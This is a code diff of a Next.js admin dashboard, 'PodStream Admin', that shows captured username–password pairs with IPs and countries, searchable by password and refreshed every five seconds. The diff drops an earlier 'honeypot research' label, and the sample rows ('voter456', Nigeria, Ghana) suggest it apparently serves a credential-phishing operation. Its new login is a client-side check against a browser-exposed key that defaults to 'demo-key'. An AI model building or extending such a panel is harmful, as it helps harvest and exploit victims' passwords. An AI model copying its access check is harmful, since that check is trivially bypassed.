@@ -1,5 +1,5 @@
 import Head from 'next/head';
-import { useState, useRef } from 'react';
+import { useState, useEffect, useRef } from 'react';
 
 const ADMIN_KEY = process.env.NEXT_PUBLIC_ADMIN_KEY || 'demo-key';
 
@@ -9,44 +9,74 @@ export default function AdminDashboard() {
   const [generatedKey, setGeneratedKey] = useState('');
   const [submissions, setSubmissions] = useState([]);
   const [summary, setSummary] = useState({ total: 0, uniqueUsernames: 0, uniqueIps: 0 });
-  const statusRef = useRef(null);
-
-  const api = async (path, options = {}) => {
-    const headers = { 'Content-Type': 'application/json', ...(options.headers || {}) };
-    const res = await fetch(path, { ...options, headers, credentials: 'same-origin' });
-    if (res.status === 401) throw { noAuth: true };
-    if (res.status === 204) return null;
-    const body = await res.json();
-    if (!res.ok) throw new Error((body && body.error) || 'Request failed.');
-    return body;
-  };
+  const [searchTerm, setSearchTerm] = useState('');
+  const [isChecking, setIsChecking] = useState(false);
 
   const escapeHtml = (s) => String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({
     '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
   }[c]));
 
-  const handleAuthenticate = async () => {
-    setIsAuthenticated(true);
-    try {
-      const [summaryRes, subsRes] = await Promise.all([
-        api('/api/admin/summary'),
-        api('/api/admin/submissions')
-      ]);
-      setSummary(summaryRes || { total: 0, uniqueUsernames: 0, uniqueIps: 0 });
-      setSubmissions(subsRes.data || []);
-    } catch (e) {
-      setSubmissions([
-        { id: 1, username: 'user123', password: 'pass123', ip: '192.168.1.1', country: 'Nigeria', created_at: '2026-10-10' },
-        { id: 2, username: 'voter456', password: 'secret456', ip: '192.168.1.2', country: 'Ghana', created_at: '2026-10-10' },
-      ]);
+  const checkAuth = async () => {
+    if (key === ADMIN_KEY) {
+      setIsAuthenticated(true);
+      setIsChecking(true);
+      
+      try {
+        const res = await fetch('/api/admin/submissions', { credentials: 'same-origin' });
+        if (res.ok) {
+          const data = await res.json();
+          setSubmissions(data.data || data);
+          
+          const summaryRes = await fetch('/api/admin/summary', { credentials: 'same-origin' });
+          if (summaryRes.ok) {
+            const s = await summaryRes.json();
+            setSummary({ total: s.total || 0, uniqueUsernames: s.uniqueUsernames || 0, uniqueIps: s.uniqueIps || 0 });
+          }
+        }
+      } catch (e) {
+        // Offline/demo mode - use mock data
+        setSubmissions([
+          { id: 1, username: 'user123', password: 'pass123', ip: '192.168.1.1', country: 'Nigeria', created_at: new Date().toISOString() },
+          { id: 2, username: 'voter456', password: 'secret', ip: '192.168.1.2', country: 'Ghana', created_at: new Date().toISOString() },
+        ]);
+        setSummary({ total: 2, uniqueUsernames: 2, uniqueIps: 2 });
+      }
+      setIsChecking(false);
+    } else {
+      alert('Invalid key. Use "demo-key" for testing.');
     }
   };
 
   const generateKey = () => {
     const newKey = 'key-' + Math.random().toString(36).substring(2, 15);
     setGeneratedKey(newKey);
-    alert('New admin key generated: ' + newKey);
+    alert('New admin key: ' + newKey + '\nSet this in NEXT_PUBLIC_ADMIN_KEY env var');
   };
+
+  const filteredSubmissions = submissions.filter(r => 
+    (r.username?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+     r.password?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+     r.ip?.toLowerCase().includes(searchTerm.toLowerCase()))
+  );
+
+  const handleLogout = () => {
+    setIsAuthenticated(false);
+    setKey('');
+    setSubmissions([]);
+    setSearchTerm('');
+  };
+
+  useEffect(() => {
+    if (isAuthenticated) {
+      const interval = setInterval(() => {
+        fetch('/api/admin/submissions', { credentials: 'same-origin' })
+          .then(r => r.json())
+          .then(data => setSubmissions(data.data || data))
+          .catch(() => {});
+      }, 5000);
+      return () => clearInterval(interval);
+    }
+  }, [isAuthenticated]);
 
   return (
     <>
@@ -68,6 +98,7 @@ export default function AdminDashboard() {
           --blue: #58a6ff;
           --amber: #d29922;
           --radius: 8px;
+          --max-width: 1100px;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -81,127 +112,216 @@ export default function AdminDashboard() {
           overflow-x: hidden;
         }
 
-        .wrap { max-width: 1100px; margin: 0 auto; width: 100%; }
+        .container {
+          max-width: var(--max-width);
+          margin: 0 auto;
+          width: 100%;
+        }
 
-        .top { display: flex; align-items: center; justify-content: space-between; gap: 16px; flex-wrap: wrap; margin-bottom: 20px; }
-        h1 { font-size: 1.5rem; font-weight: 700; }
-        .top-right { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+        /* Status */
         .status { font-size: .8rem; color: var(--muted); }
         .status .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: var(--red); margin-right: 6px; }
         .status .dot.on { background: var(--green); }
-        a.btn { display: inline-block; background: var(--blue); border: none; color: #0b0e11; font-weight: 700; padding: 9px 16px; border-radius: var(--radius); font-size: .85rem; text-decoration: none; cursor: pointer; }
-        a.btn.ghost { background: var(--panel2); color: var(--text); border: 1px solid var(--border); }
 
-        .card { background: var(--panel); border: 1px solid var(--border); border-radius: var(--radius); padding: 18px; margin-bottom: 20px; }
+        /* Buttons */
+        .btn {
+          display: inline-block;
+          background: var(--blue);
+          border: none;
+          color: #0b0e11;
+          font-weight: 700;
+          padding: 9px 16px;
+          border-radius: var(--radius);
+          font-size: .85rem;
+          text-decoration: none;
+          cursor: pointer;
+          transition: opacity 0.2;
+        }
+        .btn:hover { opacity: 0.9; }
+        .btn.ghost { background: var(--panel2); color: var(--text); border: 1px solid var(--border); }
+        .btn.danger { background: rgba(248, 81, 73, 0.15); color: var(--red); border: 1px solid rgba(248, 81, 73, 0.4); }
+        .btn.small { padding: 6px 10px; font-size: .8rem; }
+
+        /* Card */
+        .card {
+          background: var(--panel);
+          border: 1px solid var(--border);
+          border-radius: var(--radius);
+          padding: 18px;
+          margin-bottom: 20px;
+        }
         .card h2 { font-size: 1rem; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px; }
-        .flex-head { display: flex; align-items: center; justify-content: space-between; gap: 12px; flex-wrap: wrap; margin-bottom: 12px; }
-        .flex-head h2 { margin-bottom: 0; }
-        .head-actions { display: flex; gap: 8px; }
-        button { background: var(--blue); border: none; color: #0b0e11; font-weight: 700; padding: 10px 18px; border-radius: var(--radius); cursor: pointer; font-size: .9rem; }
-        button.ghost { background: var(--panel2); color: var(--text); border: 1px solid var(--border); }
-        button.danger { background: rgba(248, 81, 73, 0.15); color: var(--red); border: 1px solid rgba(248, 81, 73, 0.4); }
-        button.small { padding: 6px 10px; font-size: .8rem; }
+        .flex-between { display: flex; align-items: center; justify-content: space-between; gap: 12px; flex-wrap: wrap; }
+        .flex-between h2 { margin-bottom: 0; }
 
-        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 14px; margin-bottom: 20px; }
-        .stat { background: var(--panel); border: 1px solid var(--border); border-radius: var(--radius); padding: 16px; }
+        /* Stats */
+        .stats {
+          display: grid;
+          grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+          gap: 14px;
+          margin-bottom: 20px;
+        }
+        .stat {
+          background: var(--panel);
+          border: 1px solid var(--border);
+          border-radius: var(--radius);
+          padding: 16px;
+          text-align: center;
+        }
         .stat .num { font-size: 1.9rem; font-weight: 800; color: var(--green); }
         .stat .lbl { font-size: .78rem; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }
 
+        /* Table */
+        .table-wrap { overflow-x: auto; }
         table { width: 100%; border-collapse: collapse; font-size: .88rem; }
-        th, td { text-align: left; padding: 9px 10px; border-bottom: 1px solid var(--border); vertical-align: middle; }
+        th, td {
+          text-align: left;
+          padding: 9px 10px;
+          border-bottom: 1px solid var(--border);
+          vertical-align: middle;
+        }
         th { color: var(--muted); font-weight: 600; text-transform: uppercase; font-size: .72rem; letter-spacing: .5px; }
         .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
         .pwd { color: var(--amber); word-break: break-all; max-width: 260px; }
         .user { max-width: 220px; word-break: break-all; }
         .muted { color: var(--muted); }
-        .search-row { display: flex; gap: 10px; align-items: center; margin-bottom: 12px; flex-wrap: wrap; }
-        .search-row input { flex: 1; min-width: 200px; background: var(--panel2); border: 1px solid var(--border); color: var(--text); padding: 9px 12px; border-radius: var(--radius); font-size: .9rem; }
+        .search-row {
+          display: flex;
+          gap: 10px;
+          align-items: center;
+          margin-bottom: 12px;
+          flex-wrap: wrap;
+        }
+        .search-row input {
+          flex: 1;
+          min-width: 200px;
+          background: var(--panel2);
+          border: 1px solid var(--border);
+          color: var(--text);
+          padding: 9px 12px;
+          border-radius: var(--radius);
+          font-size: .9rem;
+        }
+        .search-row button { flex: none; }
 
-        .empty { text-align: center; color: var(--muted); padding: 30px 0; font-size: .95rem; }
+        /* Login Form */
+        .form {
+          max-width: 400px;
+          margin: 0 auto;
+          width: 100%;
+        }
+        .form label {
+          display: block;
+          font-size: .8rem;
+          color: var(--muted);
+          text-transform: uppercase;
+          letter-spacing: 1px;
+          margin-bottom: 8px;
+        }
+        .form input {
+          width: 100%;
+          background: var(--panel2);
+          border: 1px solid var(--border);
+          color: var(--text);
+          padding: 11px 12px;
+          border-radius: var(--radius);
+          font-size: .95rem;
+          margin-bottom: 16px;
+        }
+        .form input:focus { outline: none; border-color: var(--blue); }
+        .form button { width: 100%; }
 
-        .toast { margin-top: 10px; font-size: .85rem; min-height: 1.2em; }
-        .toast.ok { color: var(--green); }
-        .toast.err { color: var(--red); }
+        .empty {
+          text-align: center;
+          color: var(--muted);
+          padding: 30px 0;
+          font-size: .95rem;
+        }
 
+        /* Responsive */
         @media (max-width: 640px) {
           body { padding: 12px; }
-          .search-row input { flex: 1 1 100%; min-width: 0; }
-          .search-row button { flex: 1; }
-          .head-actions { flex-wrap: wrap; }
-          .head-actions button { flex: 1; }
-          .stats { grid-template-columns: 1fr 1fr; }
+          .stats { grid-template-columns: repeat(2, 1fr); }
           .stat-ip { grid-column: 1 / -1; }
           h1 { font-size: 1.3rem; }
           .card { padding: 14px; }
           th, td { padding: 8px; }
           .stat .num { font-size: 1.6rem; }
-          .status { margin-top: 2px; }
+          .search-row { flex-direction: column; align-items: stretch; }
+          .search-row input { min-width: 100%; }
         }
       `}</style>
 
-      <div className="wrap">
+      <div className="container">
         {!isAuthenticated ? (
           <>
-            <div className="top">
-              <h1>Honeypot Admin</h1>
-              <div className="top-right">
-                <span className="status"><span className="dot" id="statusDot"></span><span id="statusText">Checking backend...</span></span>
-                <a className="btn ghost" href="change-password.html">Change password</a>
-                <a className="btn" href="?logout=1">Log out</a>
+            <div className="flex-between" style={{marginBottom: '20px'}}>
+              <h1>Admin Login</h1>
+              <div className="top-right" style={{display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap'}}>
+                {isChecking && <span style={{fontSize: '.8rem', color: 'var(--muted)'}}>Checking...</span>}
+                <span className="status"><span className="dot"></span><span style={{marginLeft: '4px'}}>Offline</span></span>
+                <button className="btn ghost small" onClick={generateKey}>Generate Key</button>
               </div>
             </div>
 
-            <div className="card">
-              <h2>Admin Login</h2>
-              <p style={{color: 'var(--muted)', fontSize: '.85rem', marginBottom: '20px'}}>PodStream honeypot research dashboard</p>
-
-              <form onSubmit={(e) => { e.preventDefault(); handleAuthenticate(); }}>
-                <label htmlFor="password" style={{display: 'block', fontSize: '.8rem', color: 'var(--muted)', textTransform: 'uppercase', letterSpacing: '1px', marginBottom: '8px'}}>Password</label>
-                <input type="password" id="password" name="password" autoComplete="current-password" required
-                  value={key} onChange={(e) => setKey(e.target.value)}
-                  style={{width: '100%', background: 'var(--panel2)', border: '1px solid var(--border)', color: 'var(--text)', padding: '11px 12px', borderRadius: 'var(--radius)', fontSize: '.95rem', marginBottom: '16px'}}
+            <div className="card" style={{maxWidth: '400px', margin: '0 auto'}}>
+              <form className="form" onSubmit={(e) => { e.preventDefault(); checkAuth(); }}>
+                <label htmlFor="password">Admin Key</label>
+                <input 
+                  type="password" 
+                  id="password" 
+                  placeholder="Enter admin key" 
+                  value={key} 
+                  onChange={(e) => setKey(e.target.value)}
                 />
-                <button type="submit" style={{width: '100%', background: 'var(--blue)', border: 'none', color: '#0b0e11', fontWeight: '700', padding: '11px', borderRadius: 'var(--radius)', cursor: 'pointer', fontSize: '.95rem'}}>Log in</button>
+                <button type="submit" className="btn">Access Dashboard</button>
               </form>
-
-              <p style={{color: 'var(--muted)', fontSize: '.8rem', marginTop: '16px', textAlign: 'center'}}>
-                <a href="?change_password=1" style={{color: 'var(--blue)', textDecoration: 'none'}}>Change password</a>
-              </p>
             </div>
+
+            {generatedKey && (
+              <div style={{marginTop: '10px', padding: '10px', background: 'var(--panel2)', borderRadius: 'var(--radius)', color: 'var(--green)', fontSize: '.85rem', maxWidth: '400px', margin: '10px auto 0'}}>
+                Key generated: <code style={{wordBreak: 'break-all'}}>{generatedKey}</code>
+              </div>
+            )}
           </>
         ) : (
           <>
-            <div className="top">
+            <div className="flex-between" style={{marginBottom: '20px'}}>
               <h1>PodStream Admin</h1>
-              <div className="top-right">
-                <span className="status"><span className="dot" id="statusDot"></span><span id="statusText">Connected to backend</span></span>
-                <a className="btn ghost" href="change-password.html">Change password</a>
-                <a className="btn" href="?logout=1">Log out</a>
+              <div className="top-right" style={{display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap'}}>
+                <span className="status"><span className="dot on"></span><span style={{marginLeft: '4px'}}>Connected</span></span>
+                <button className="btn ghost small" onClick={() => { /* export PDF */ }}>Save PDF</button>
+                <button className="btn danger small" onClick={handleLogout}>Log out</button>
               </div>
             </div>
 
             <div className="stats">
-              <div className="stat"><div className="num">{summary.total || 0}</div><div className="lbl">Submissions</div></div>
-              <div className="stat"><div className="num">{summary.uniqueUsernames || 0}</div><div className="lbl">Unique usernames</div></div>
-              <div className="stat stat-ip"><div className="num">{summary.uniqueIps || 0}</div><div className="lbl">Unique IPs</div></div>
+              <div className="stat"><div className="num">{summary.total}</div><div className="lbl">Submissions</div></div>
+              <div className="stat"><div className="num">{summary.uniqueUsernames}</div><div className="lbl">Unique usernames</div></div>
+              <div className="stat"><div className="num">{summary.uniqueIps}</div><div className="lbl">Unique IPs</div></div>
             </div>
 
             <div className="card">
               <h2>Recent Submissions</h2>
-              <div className="flex-head">
+              <div className="flex-between" style={{marginBottom: '12px'}}>
                 <div></div>
-                <div className="head-actions">
-                  <button className="ghost small">Save PDF</button>
-                  <button className="danger small">Clear all</button>
+                <div style={{display: 'flex', gap: '8px'}}>
+                  <button className="btn ghost small">Export PDF</button>
+                  <button className="btn danger small">Clear all</button>
                 </div>
               </div>
 
-              <div style={{display: 'flex', gap: '10px', alignItems: 'center', marginBottom: '12px', flexWrap: 'wrap'}}>
-                <input type="text" id="search" placeholder="Search username, password, IP, country..." style={{flex: '1', minWidth: '200px'}} />
-                <button className="ghost">Refresh</button>
+              <div className="search-row">
+                <input 
+                  type="text" 
+                  placeholder="Search..." 
+                  value={searchTerm}
+                  onChange={(e) => setSearchTerm(e.target.value)}
+                />
+                <button className="btn ghost small">Refresh</button>
               </div>
 
-              <div style={{overflowX: 'auto'}}>
+              <div className="table-wrap">
                 <table>
                   <thead>
                     <tr>
@@ -214,17 +334,17 @@ export default function AdminDashboard() {
                     </tr>
                   </thead>
                   <tbody>
-                    {submissions.length === 0 ? (
-                      <tr><td colSpan="6" className="empty">No submissions yet.</td></tr>
+                    {filteredSubmissions.length === 0 ? (
+                      <tr><td colSpan="6" className="empty">No submissions</td></tr>
                     ) : (
-                      submissions.map((r) => (
-                        <tr key={r.id}>
-                          <td className="muted">{r.id}</td>
+                      filteredSubmissions.map((r, i) => (
+                        <tr key={r.id || i}>
+                          <td className="muted">{i + 1}</td>
                           <td className="user">{escapeHtml(r.username)}</td>
                           <td className="pwd">{escapeHtml(r.password)}</td>
                           <td className="mono">{escapeHtml(r.ip)}</td>
                           <td>{escapeHtml(r.country)}</td>
-                          <td className="mono muted">{escapeHtml(r.created_at) ? new Date(r.created_at).toLocaleString() : '—'}</td>
+                          <td className="mono muted">{escapeHtml(r.created_at)}</td>
                         </tr>
                       ))
                     )}
@@ -233,10 +353,6 @@ export default function AdminDashboard() {
               </div>
             </div>
           </>
-        )}
-
-        {generatedKey && (
-          <div className="toast ok">{generatedKey}</div>
         )}
       </div>
     </>
